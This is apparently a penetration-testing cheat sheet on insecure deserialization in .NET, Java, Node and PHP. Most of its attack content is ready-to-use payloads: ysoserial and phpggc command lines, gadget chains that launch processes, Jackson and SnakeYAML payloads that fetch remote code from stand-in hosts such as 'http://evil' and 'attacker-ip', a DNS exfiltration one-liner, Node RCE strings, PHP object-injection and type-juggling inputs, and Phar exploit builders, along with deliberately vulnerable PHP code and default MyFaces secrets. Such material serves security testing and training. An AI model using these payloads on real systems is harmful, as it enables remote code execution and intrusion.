# Insecure Deserialization

> Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process -- taking data structured from some format, and rebuilding it into an object - OWASP

## Deserialization Identifier

Check the following sub-sections, located in other chapters :

* [Java deserialization : ysoserial, ...](Java.md)
* [PHP (Object injection) : phpggc, ...](PHP.md)
* [Ruby : universal rce gadget, ...](Ruby.md)
* [Python : pickle, PyYAML, ...](Python.md)
* [.NET : ysoserial.net, ...](DotNET.md)

| Object Type     | Header (Hex)   | Header (Base64) | Indicators       |
|-----------------|----------------|-----------------|------------------|
| .NET ViewState  | `FF 01`        | `/w`            | Commonly found inside hidden inputs around HTML forms |
| BinaryFormatter | `0001 0000 00FF FFFF FF01` | `AAEAAAD` | Base64 decode and check for the long `FF FF FF FF` sequence. |
| Java Serialized | `AC ED`        | `rO`            | Base64 decode and check first bytes. |
| PHP Serialized  | `4F 3A`        | `Tz`            | Prefixes like `O:, a:, s:, i:, b:` and length indicators. |
| Python Pickle   | `80 04 95`     | `gASV`          | Text: opcodes like `(lp0, S'Test'`. |
| Ruby Marshal    | `04 08`        | `BAgK`          | Base64 decode and look for `\x04\x08` at the start. |

## POP Gadgets

> A POP (Property Oriented Programming) gadget is a piece of code implemented by an application's class, that can be called during the deserialization process.

POP gadgets characteristics:

* Can be serialized
* Has public/accessible properties
* Implements specific vulnerable methods
* Has access to other "callable" classes


---

# .NET Deserialization

> .NET serialization is the process of converting an object’s state into a format that can be easily stored or transmitted, such as XML, JSON, or binary. This serialized data can then be saved to a file, sent over a network, or stored in a database. Later, it can be deserialized to reconstruct the original object with its data intact. Serialization is widely used in .NET for tasks like caching, data transfer between applications, and session state management.

## Detection

| Data           | Description         |
| -------------- | ------------------- |
| `AAEAAD` (Hex) | .NET BinaryFormatter |
| `FF01` (Hex)   | .NET ViewState |
| `/w` (Base64)   | .NET ViewState |

Example: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`

## Tools

* [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) - Deserialization payload generator for a variety of .NET formatters

    ```ps1
    cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
    ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
    ```

* [irsdl/ysonet](https://github.com/irsdl/ysonet) - Deserialization payload generator for a variety of .NET formatters

    ```ps1
    cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysonet.exe -p DotNetNuke -m read_file -f win.ini
    ./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
    ```

## Formatters

.NET Native Formatters from [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)

### XmlSerializer

* In C# source code, look for `XmlSerializer(typeof(<TYPE>));`.
* The attacker must control the **type** of the XmlSerializer.
* Payload output: **XML**

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

### DataContractSerializer

> The DataContractSerializer deserializes in a loosely coupled way. It never reads common language runtime (CLR) type and assembly names from the incoming data. The security model for the XmlSerializer is similar to that of the DataContractSerializer, and differs mostly in details. For example, the XmlIncludeAttribute attribute is used for type inclusion instead of the KnownTypeAttribute attribute.

* In C# source code, look for `DataContractSerializer(typeof(<TYPE>))`.
* Payload output: **XML**
* Data **Type** must be user-controlled to be exploitable

### NetDataContractSerializer

> It extends the `System.Runtime.Serialization.XmlObjectSerializer` class and is capable of serializing any type annotated with serializable attribute as `BinaryFormatter`.

* In C# source code, look for `NetDataContractSerializer().ReadObject()`.
* Payload output: **XML**

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### LosFormatter

* Use `BinaryFormatter` internally.

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### JSON.NET

* In C# source code, look for `JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`.
* Payload output: **JSON**

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### BinaryFormatter

> The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they're processing to be trustworthy. BinaryFormatter is insecure and can’t be made secure.

* In C# source code, look for `System.Runtime.Serialization.Binary.BinaryFormatter`.
* Exploitation requires `[Serializable]` or `ISerializable` interface.
* Payload output: **Binary**

```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## POP Gadgets

These gadgets must have the following properties:

* Serializable
* Public/settable variables
* Magic "functions": Get/Set, OnSerialisation, Constructors/Destructors

You must carefully select your **gadgets** for a targeted **formatter**.

List of popular gadgets used in common payloads.

* **ObjectDataProvider** from `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll`
    * Use `MethodParameters` to set arbitrary parameters
    * Use `MethodName` to call an arbitrary function
* **ExpandedWrapper**
    * Specify the `object types` of the objects that are encapsulated

    ```cs
    ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
    ```

* **System.Configuration.Install.AssemblyInstaller**
    * Execute payload with Assembly.Load

    ```cs
    // System.Configuration.Install.AssemblyInstaller
    public void set_Path(string value){
        if (value == null){
            this.assembly = null;
        }
        this.assembly = Assembly.LoadFrom(value);
    }
    ```


---

# Java Deserialization

> Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs.

## Detection

* `"AC ED 00 05"` in Hex
    * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.
    * `00 05`: STREAM_VERSION. The serialization version.
* `"rO0"` in Base64
* `Content-Type` = "application/x-java-serialized-object"
* `"H4sIAAAAAAAAAJ"` in gzip(base64)

## Tools

### Ysoserial

[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

**List of payloads included in ysoserial:**

| Payload             | Authors                                | Dependencies |
| ------------------- | -------------------------------------- | --- |
| AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |
| BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5 |
| C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
| Click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
| Clojure             | @JackOfMostTrades                      | clojure:1.8.0 |
| CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
| CommonsCollections1 | @frohoff                               | commons-collections:3.1 |
| CommonsCollections2 | @frohoff                               | commons-collections4:4.0 |
| CommonsCollections3 | @frohoff                               | commons-collections:3.1 |
| CommonsCollections4 | @frohoff                               | commons-collections4:4.0 |
| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1  |
| CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1  |
| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1  |
| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4|
| Groovy1             | @frohoff                               | groovy:2.3.9            |
| Hibernate1          | @mbechler                              | |
| Hibernate2          | @mbechler                              | |
| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| JRMPClient          | @mbechler                              | |
| JRMPListener        | @mbechler                              | |
| JSON1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| Jdk7u21             | @frohoff                               | |
| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2 |
| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2 |
| MozillaRhino2       | @_tint0                                | js:1.7R2 |
| Myfaces1            | @mbechler                              | |
| Myfaces2            | @mbechler                              | |
| ROME                | @mbechler                              | rome:1.0 |
| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |
| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |
| URLDNS              | @gebl                                  | |
| Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
| Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |

### Burp extensions

* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) -  Burp extension to perform Java Deserialization Attacks
* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities
* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite
* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java Deserialization Vulnerability Identification
* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java Deserialization Vulnerability Active Identification Burp Extender

### Alternative Tooling

* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Pure JRE 8 RCE Deserialization gadget
* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - A fork of the original ysoserial application
* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Exploiting Deserialization to Brute-Force the Remote Classpath
* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Python code to Serialize and Unserialize java binary serialization format.

  ```java
  java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
  python deserek.py yss_base.bin --format python > yss_url.py
  python yss_url.py yss_new.bin
  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
  ```

* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution

  ```java
  $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
  $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
  $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
  // -a - generates/tests all payloads for that marshaller
  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
  // -v - verbose mode, e.g. also shows the generated payload in test mode.
  // gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
  // arguments - Gadget specific arguments
  ```

Payload generators for the following marshallers are included:

| Marshaller                      | Gadget Impact                                |
| ------------------------------- | ---------------------------------------------- |
| BlazeDSAMF(0&#124;3&#124;X)     | JDK only escalation to Java serialization various third party libraries RCEs |
| Hessian&#124;Burlap             | various third party RCEs |
| Castor                          | dependency library RCE |
| Jackson                         | **possible JDK only RCE**, various third party RCEs |
| Java                            | yet another third party RCE |
| JsonIO                          | **JDK only RCE** |
| JYAML                           | **JDK only RCE** |
| Kryo                            | third party RCEs |
| KryoAltStrategy                 | **JDK only RCE** |
| Red5AMF(0&#124;3)               | **JDK only RCE** |
| SnakeYAML                       | **JDK only RCEs** |
| XStream                         | **JDK only RCEs** |
| YAMLBeans                       | third party RCE |

## JSON Deserialization

Multiple libraries can be used to handle JSON in Java.

* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#fastjson-json)
* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)
* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)
* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)

**Jackson**:

Jackson is a popular Java library used for working with JSON (JavaScript Object Notation) data.
Jackson-databind supports Polymorphic Type Handling (PTH), formerly known as "Polymorphic Deserialization", which is disabled by default.

To determine if the backend is using Jackson, the most common technique is to send an invalid JSON and inspect the error message. Look for references to either of those:

```java
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

* com.fasterxml.jackson.databind
* org.codehaus.jackson.map

**Exploitation**:

* **CVE-2017-7525**

  ```json
  {
    "param": [
      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
      {
        "transletBytecodes": [
          "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
        ],
        "transletName": "a.b",
        "outputProperties": {}
      }
    ]
  }
    ```

* **CVE-2017-17485**

  ```json
  {
    "param": [
      "org.springframework.context.support.FileSystemXmlApplicationContext",
      "http://evil/spel.xml"
    ]
  }
  ```

* **CVE-2019-12384**

  ```json
  [
    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
    }
  ]
  ```

* **CVE-2020-36180**

  ```json
  [
    "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
    }
  ]
  ```

* **CVE-2020-9548**

    ```json
    [
      "br.com.anteros.dbcp.AnterosDBCPConfig",
      {
        "healthCheckRegistry": "ldap://{{interactsh-url}}"
      }
    ]
    ```

## YAML Deserialization

* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)

**SnakeYAML**:

SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## ViewState

In Java, ViewState refers to the mechanism used by frameworks like JavaServer Faces (JSF) to maintain the state of UI components between HTTP requests in web applications. There are 2 major implementations:

* Oracle Mojarra (JSF reference implementation)
* Apache MyFaces

**Tools**:

* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool
* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace is a software used to patch unencrypted and unsigned JSF ViewStates.

### Encoding

| Encoding      | Starts with |
| ------------- | ----------- |
| base64        | `rO0`       |
| base64 + gzip | `H4sIAAA`   |

### Storage

The `javax.faces.STATE_SAVING_METHOD` is a configuration parameter in JavaServer Faces (JSF). It specifies how the framework should save the state of a component tree (the structure and data of UI components on a page) between HTTP requests.

The storage method can also be inferred from the viewstate representation in the HTML body.

* **Server side** storage: `value="-XXX:-XXXX"`
* **Client side** storage: `base64 + gzip + Java Object`

### Encryption

By default MyFaces uses DES as encryption algorithm and HMAC-SHA1 to authenticate the ViewState. It is possible and recommended to configure more recent algorithms like AES and HMAC-SHA256.

| Encryption Algorithm | HMAC        |
| -------------------- | ----------- |
| DES ECB (default)    | HMAC-SHA1   |

Supported encryption methods are BlowFish, 3DES, AES and are defined by a context parameter.
The value of these parameters and their secrets can be found inside these XML clauses.

```xml
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
<param-name>org.apache.myfaces.SECRET</param-name>   
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

Common secrets from the [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).

| Name                 | Value                              |
| -------------------- | ---------------------------------- |
| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`         |
| DES                  | `NzY1NDMyMTA=<`                    |
| DESede               | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| Blowfish             | `NzY1NDMyMTA3NjU0MzIxMA`           |
| AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`         |

* **Encryption**: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
* **Decryption**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data


---

# Node Deserialization

> Node.js deserialization refers to the process of reconstructing JavaScript objects from a serialized format, such as JSON, BSON, or other formats that represent structured data. In Node.js applications, serialization and deserialization are commonly used for data storage, caching, and inter-process communication.

## Methodology

* In Node source code, look for:

    * `node-serialize`
    * `serialize-to-js`
    * `funcster`

### node-serialize

> An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).

1. Generate a serialized payload

    ```js
    var y = {
        rce : function(){
            require('child_process').exec('ls /', function(error,
            stdout, stderr) { console.log(stdout) });
        },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));
    ```

2. Add bracket `()` to force the execution

    ```js
    {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
    ```

3. Send the payload

### funcster

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```


---

# PHP Deserialization

> PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.

## General Concept

The following magic methods will help you for a PHP Object injection

* `__wakeup()` when an object is unserialized.
* `__destruct()` when an object is deleted.
* `__toString()` when an object is converted to a string.

Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.

Vulnerable code:

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

Craft a payload using existing code inside the application.

* Basic serialized data

    ```php
    a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
    ```

* Command execution

    ```php
    string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
    ```

## Authentication Bypass

### Type Juggling

Vulnerable code:

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

Payload:

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

Because `true == "str"` is true.

## Object Injection

Vulnerable code:

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

We can do an array like this:

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## Finding and Using Gadgets

Also called `"PHP POP Chains"`, they can be used to gain RCE on the system.

* In PHP source code, look for `unserialize()` function.
* Interesting [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debugInfo()`:
    * `__construct()`: PHP allows developers to declare constructor methods for classes. Classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
    * `__destruct()`: The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
    * `__call(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
    * `__callStatic(string $name, array $arguments)`: The `$name` argument is the name of the method being called. The `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
    * `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
    * `__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
    * `__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
    * `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
    * `__sleep()`: `serialize()` checks if the class has a function with the magic name `__sleep()`. If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then **null** is serialized and **E_NOTICE** is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
    * `__wakeup()`: `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. If present, this function can reconstruct any resources that the object may have. The intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
    * `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. If so, that function is executed prior to any serialization. It must construct and return an associative array of key/value pairs that represent the serialized form of the object. If no array is returned a TypeError will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
    * `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
    * `__toString()`: The __toString() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
    * `__invoke()`: The `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
    * `__set_state(array $properties)`: This static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
    * `__clone()`: Once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
    * `__debugInfo()`: This method is called by `var_dump()` when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)

[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:

* Laravel
* Symfony
* SwiftMailer
* Monolog
* SlimPHP
* Doctrine
* Guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

## Phar Deserialization

Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.

A valid PHAR includes four elements:

1. **Stub**: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.
2. **Manifest**: Contains metadata about the archive and its contents.
3. **File Contents**: Contains the actual files in the archive.
4. **Signature**(optional): For verifying archive integrity.

* Example of a Phar creation in order to exploit a custom `PDFGenerator`.

    ```php
    <?php
    class PDFGenerator { }

    //Create a new instance of the Dummy class and modify its property
    $dummy = new PDFGenerator();
    $dummy->callback = "passthru";
    $dummy->fileName = "uname -a > pwned"; //our payload

    // Delete any existing PHAR archive with that name
    @unlink("poc.phar");

    // Create a new archive
    $poc = new Phar("poc.phar");

    // Add all write operations to a buffer, without modifying the archive on disk
    $poc->startBuffering();

    // Set the stub
    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

    /* Add a new file in the archive with "text" as its content*/
    $poc["file"] = "text";
    // Add the dummy object to the metadata. This will be serialized
    $poc->setMetadata($dummy);
    // Stop buffering and write changes to disk
    $poc->stopBuffering();
    ?>
    ```

* Example of a Phar creation with a `JPEG` magic byte header since there is no restriction on the content of stub.

    ```php
    <?php
    class AnyClass {
        public $data = null;
        public function __construct($data) {
            $this->data = $data;
        }
        
        function __destruct() {
            system($this->data);
        }
    }

    // create new Phar
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

    // add object of any class as meta data
    $object = new AnyClass('whoami');
    $phar->setMetadata($object);
    $phar->stopBuffering();
    ```

## Real World Examples

